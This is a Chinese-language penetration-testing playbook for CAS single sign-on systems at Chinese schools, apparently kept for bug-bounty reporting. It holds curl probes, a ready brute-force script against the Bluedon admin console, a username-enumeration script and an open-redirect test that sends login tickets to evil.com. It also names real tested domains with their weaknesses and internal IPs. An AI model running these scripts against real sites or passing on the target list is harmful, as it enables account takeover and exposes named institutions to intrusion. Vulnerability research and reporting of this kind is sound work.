# CAS (Central Authentication Service) 漏洞测试模式

## 目的
教育机构广泛使用CAS统一身份认证系统。本文档记录CAS系统的常见漏洞模式和测试方法。

## CAS系统指纹识别

### 常见CAS实现
| 指纹 | 供应商 | 特征 |
|------|--------|------|
| lyuapServer | 蓝盾(Bluedon) | 路径: /lyuapServer/login |
| ly_web_casconsole | 蓝盾(Bluedon) | 管理控制台: /ly_web_casconsole/system/login!login.action |
| ycServer | 金智教育 | CAS SSO |
| login-wisedu_v1.0.js | 金智教育 | JS文件名，含pwdDefaultEncryptSalt |
| CacheTicketRegistry | 金智教育 | com.wisedu.authserver.ticket.registry |
| SWUI / sw-ui | 树维信息 | CAS/一站式服务大厅 |
| CAS 5.x | Apereo | 开源CAS |

### 金智教育CAS专项测试
见 `references/wisedu-cas-testing-patterns.md` — 金智CAS完整漏洞测试模式：密钥泄露、会话固定、Status端点信息泄露、service参数白名单校验。含指纹命令和报告模板。
| CAS 5.x | Apereo | 开源CAS |

### 蓝盾CAS指纹命令
```bash
# 检测lyuapServer
curl -sk 'https://<target>/lyuapServer/login' | head -20

# 检测ly_web_casconsole
curl -sk 'https://<target>/ly_web_casconsole/system/login!login.action'

# 检测技术栈(从堆栈泄露)
curl -sk 'https://<target>/ly_web_casconsole/system/login!logincheck.action' \
  -X POST -d 'myusername=admin&password=123456&captcha=1234'
```

## 高危漏洞模式

### 1. 验证码明文泄露
**特征**: getyzm.action返回JSON包含rand字段
```bash
# 测试
curl -s 'https://<target>/ly_web_casconsole/system/login!getyzm.action' | grep -oP '"rand":"\K[^"]+'
# 返回: "6198" (验证码明文)
```
**危害**: 结合无账号锁定，可暴力破解管理后台

### 2. 客户端验证码校验
**特征**: 密码找回页面JS直接比对验证码值
```bash
# 分析JS逻辑
curl -sk 'https://<target>/safe/findPassByOther.jsp' | grep -A10 'function getcode1'
# 关键: if ((yan.toLocaleLowerCase().trim()+"") != (message.trim()+""))

# 验证码接口返回明文
curl -sk 'https://<target>/safe/yanzhengma.jsp?0.123456'
# 返回: 3847 (4位数字)
```
**绕过方法**: 直接调用后端接口，跳过客户端验证码检查

### 3. 无账号锁定机制
**特征**: 连续多次失败登录不触发锁定
```bash
# 测试脚本
for i in $(seq 1 20); do
  RAND=$(curl -s -c /tmp/cas_${i}.txt 'https://<target>/ly_web_casconsole/system/login!getyzm.action' | grep -oP '"rand":"\K[^"]+')
  curl -sk -b /tmp/cas_${i}.txt 'https://<target>/ly_web_casconsole/system/login!logincheck.action' \
    -X POST -d "myusername=admin&password=test${i}&captcha=${RAND}" 2>/dev/null | grep -oP '"message":"[^"]*"'
done
# 如果全部返回"填写正确的帐号密码"而无锁定提示，则存在漏洞
```

### 4. 特定密码触发堆栈泄露
**特征**: 密码123456/1234/111111触发HTML错误页
```bash
# 测试
RAND=$(curl -s -c /tmp/cas.txt 'https://<target>/ly_web_casconsole/system/login!getyzm.action' | grep -oP '"rand":"\K[^"]+')
curl -sk -b /tmp/cas.txt 'https://<target>/ly_web_casconsole/system/login!logincheck.action' \
  -X POST -d "myusername=admin&password=123456&captcha=${RAND}" | grep -oP '<title>[^<]*'
# 返回: "出错了！！" (堆栈泄露)
# 正常密码返回JSON: {"result":{"message":"填写正确的帐号密码"}}
```

### 5. CAS开放重定向
**特征**: service参数未校验，可注入任意URL
```bash
# 测试
curl -sk 'https://<target>/lyuapServer/login?service=https://evil.com/steal-ticket' | grep -oP 'action="[^"]*"'
# 返回: action="/lyuapServer/login;jsessionid=xxx?service=https://evil.com/steal-ticket"
```
**危害**: 登录后Ticket发送到攻击者服务器

### 6. 密保问题校验逻辑缺陷
**特征**: checkquestionbinding对所有用户返回true
```bash
# 测试
curl -sk 'https://<target>/safe/checkquestionbinding.jsp' -X POST -d 'account=admin'
curl -sk 'https://<target>/safe/checkquestionbinding.jsp' -X POST -d 'account=nonexistentuser12345'
# 如果都返回true，则存在逻辑缺陷
```

### 7. QR Code登录钓鱼
**特征**: QR Code生成接口可任意调用
```bash
# 获取QR Code和UUID
curl -sk 'https://<target>/lyuapServer/QrCodeServlet?cmd=getQr'
# 返回: {"uuid":"xxx","content":"base64..."}

# 轮询扫码状态
curl -sk 'https://<target>/lyuapServer/CheckScan?uuidQr=<uuid>'
```

## 密码重置流程分析

### 标准流程
1. findPassByOther.jsp - 输入账号、姓名、身份证
2. yanzhengma.jsp - 获取验证码
3. checkaccountmassage.jsp - 验证账号信息
4. checkquestionbinding.jsp - 检查密保问题
5. changepwdbyquestion.jsp - 回答密保问题
6. changepwd.jsp - 设置新密码

### 关键接口
```bash
# 验证码获取(返回明文)
curl -sk 'https://<target>/safe/yanzhengma.jsp?0.123456'

# 账号信息验证
curl -sk 'https://<target>/safe/checkaccountmassage.jsp' -X POST \
  -d 'account=admin&xm=test&myname=110101200001010011'

# 密保问题检查
curl -sk 'https://<target>/safe/checkquestionbinding.jsp' -X POST -d 'account=admin'

# 密码修改页面(可能无需认证)
curl -sk 'https://<target>/safe/changepwd.jsp'
```

## 自动化爆破脚本模板

```bash
#!/bin/bash
# CAS管理后台暴力破解(利用验证码明文泄露+无账号锁定)
TARGET="https://<target>/ly_web_casconsole/system/login!logincheck.action"
CAPTCHA_URL="https://<target>/ly_web_casconsole/system/login!getyzm.action"
USER="admin"

for PASS in "123456" "admin" "admin123" "password" "xjjt123" "Xjjt@123"; do
  RAND=$(curl -s -c /tmp/cas_brute_${RANDOM}.txt "$CAPTCHA_URL" 2>/dev/null | grep -oP '"rand":"\K[^"]+')
  RESP=$(curl -sk -b /tmp/cas_brute_${RANDOM}.txt "$TARGET" -X POST \
    -d "myusername=${USER}&password=${PASS}&captcha=${RAND}" 2>/dev/null)
  if echo "$RESP" | grep -q '"success":true'; then
    echo "[!!!] 成功! 用户: ${USER} 密码: ${PASS}"
    break
  fi
done
```

## 报告模板

```
标题: <学校名称>CAS统一身份认证平台<漏洞名称>
域名: <域名>
类型: <类型>
等级: 高危/中危/低危
行业: 教育
地址: <省份><城市><区>
URL: <完整URL>

详情: <漏洞描述>

复现:
1. <步骤1>
curl -sk '<URL>'

2. <步骤2>
...

影响: <危害描述>

修复建议:
1. <建议1>
2. <建议2>
```

## SUDY (树维) CAS 漏洞模式

### 指纹识别
- 登录页路径: `/sso/login`
- 主题目录: `/sso/themes/sudy_njsj/`
- JS文件: `/sso/js/cas.js`, `/sso/js/security.js` (RSA加密)
- 表单字段: `username`, `password`, `authcode`(验证码), `execution`(加密token), `encrypted=true`, `rememberMe`
- 验证码图片: `/sso/captcha.jpg`
- CSRF: `<meta name="_csrf" content=""/>` (可能为空)

### 1. REST API 用户名枚举 (中危)
**特征**: `/sso/v1/tickets` 端点对存在/不存在用户返回不同错误
```bash
# 存在的用户 → FailedLoginException
curl -sk -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=admin&password=wrongpass' 'http://sso.<target>/sso/v1/tickets'
# 返回: {"authentication_exceptions": ["FailedLoginException"]}

# 不存在的用户 → AccountNotFoundException
curl -sk -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=nonexistentuser12345&password=wrongpass' 'http://sso.<target>/sso/v1/tickets'
# 返回: {"authentication_exceptions": ["AccountNotFoundException"]}
```
**要点**:
- REST API无验证码保护，可直接枚举
- 账号锁定阈值: 3次失败后返回 `LoginLockException`
- 可在锁定前每次测试1-2个用户名，控制频率批量枚举
- 常见存在用户: admin, test, guest

### 2. CAS Service Validation 信息泄露
**特征**: serviceValidate返回详细错误，泄露service registry信息
```bash
curl -sk 'http://sso.<target>/sso/serviceValidate?service=https://evil.com&ticket=ST-fake'
# 返回: "Service [https://evil.com] is not found in service registry."
```
**可探测端点**: `/sso/serviceValidate`, `/sso/proxyValidate`, `/sso/p3/serviceValidate`

### 3. OAuth回调内部IP泄露
**特征**: 登录页QQ/微博OAuth回调URL硬编码内网IP
```bash
curl -sk 'http://sso.<target>/sso/login' | grep -oP 'http%3A%2F%2F[0-9.]+:[0-9]+'
# 解码后: http://172.x.x.x:8060/cas/qq/authlogin
```

### 4. HTTPS→HTTP降级
**特征**: nginx配置将HTTPS 301到HTTP，导致凭据明文传输
```bash
curl -sk -I 'https://sso.<target>/sso/login' | grep -i location
# 返回: Location: http://sso.<target>/sso/login
```

### 5. /sso/status 泄露Spring Security框架
**特征**: status端点返回401时泄露框架内部类名
```bash
curl -sk 'http://sso.<target>/sso/status' | grep -i 'AbstractAccessDecisionManager'
# 返回: <p>AbstractAccessDecisionManager.accessDenied</p>
```
**危害**: 确认Spring Security框架，辅助针对性攻击

### 6. CSRF Token为空
**特征**: 登录页面的CSRF元标签内容为空字符串
```bash
curl -sk 'http://sso.<target>/sso/login' | grep '_csrf'
# 返回: <meta name="_csrf" content=""/>
#        <meta name="_csrf_header" content=""/>
```
**危害**: CSRF保护可能未生效，可构造恶意登录页面

### 7. SUDY IDS 密码找回系统信息泄露
**特征**: imp子域运行SUDY IDS密码找回系统，多个API无需认证
```bash
# 安全问题列表(无需认证)
curl -sk 'http://imp.<target>/_web/_apps/ids/user/passQuestion.json?domainId=1'
# 返回: [{"id":"我最喜欢的歌曲？","text":"我最喜欢的歌曲？"}, ...]

# 密码找回配置(需Referer但无认证)
curl -sk 'http://imp.<target>/_web/_apps/ids/api/passwordRecovery/config.rst?domainId=1'

# 错误页面泄露内部IP
curl -sk 'http://imp.<target>/_web/_apps/ids/api/passwordRecovery/new.rst' | grep 'value='
# 返回: <input type="hidden" id="clientIp" value="169.254.64.19" />
#        <input type="hidden" id="x_forwarded_for" value="210.28.92.31" />

# 验证码图片(无需认证)
curl -sk -o /dev/null -w '%{http_code}' 'http://imp.<target>/_control/validateimage'
```
**子域**: 通常为 `imp.<domain>` 或 `ids.<domain>`
**技术栈**: Tengine + Tomcat 8.5.x + jQuery EasyUI
**危害**: 泄露密保问题列表、内部IP、密码找回配置

### SUDY CAS 自动化枚举脚本
```bash
#!/bin/bash
# SUDY CAS REST API用户名枚举
SSO_URL="http://sso.<target>/sso/v1/tickets"
USERS="admin test guest student teacher user root system info"

for USER in $USERS; do
  RESP=$(curl -sk --max-time 3 -X POST \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -d "username=${USER}&password=test123" "$SSO_URL" 2>/dev/null)
  if echo "$RESP" | grep -q "AccountNotFoundException"; then
    echo "$USER -> 不存在"
  elif echo "$RESP" | grep -q "FailedLoginException"; then
    echo "$USER -> 存在"
  elif echo "$RESP" | grep -q "LoginLockException"; then
    echo "$USER -> 已锁定"
  fi
  sleep 1  # 避免触发频率限制
done
```

### 已测试SUDY CAS目标
| 目标 | 发现 | 备注 |
|------|------|------|
| nau.edu.cn | REST API用户名枚举+内部IP泄露+HTTPS降级+status框架泄露+空CSRF+IDS密码找回信息泄露 | nginx/1.22.0, 3次锁定, imp子域运行SUDY IDS |

## 已测试目标

| 目标 | 发现漏洞 | 技术栈 |
|------|---------|--------|
| xjjtedu.com | 11个(高1/中6/低4) | 蓝盾CAS+Tomcat7+Shiro+CoCall |
| xjjtxy.cn | CAS控制台+lyuapServer | Struts2+Hibernate3+Spring |
| xjjtxy.top | BPM系统 | Apache Shiro |
| xjjtedu.cn:65083 | CoCall视频会议 | 华宇信息Thunisoft |

## 注意事项

1. 验证码明文泄露+无账号锁定 = 高危组合，可暴力破解
2. 开放重定向可窃取全校师生CAS Ticket
3. 客户端验证码校验可绕过密码找回保护
4. 特定密码(123456等)可能触发堆栈泄露
5. 密保问题校验可能对所有用户返回true
6. SUDY CAS: `/sso/v1/tickets` REST API无验证码，3次锁定前可枚举用户名
7. SUDY CAS: 登录页可能泄露内网IP(OAuth回调URL中硬编码)
8. CAS系统HTTPS→HTTP降级是常见配置错误，检查Location头
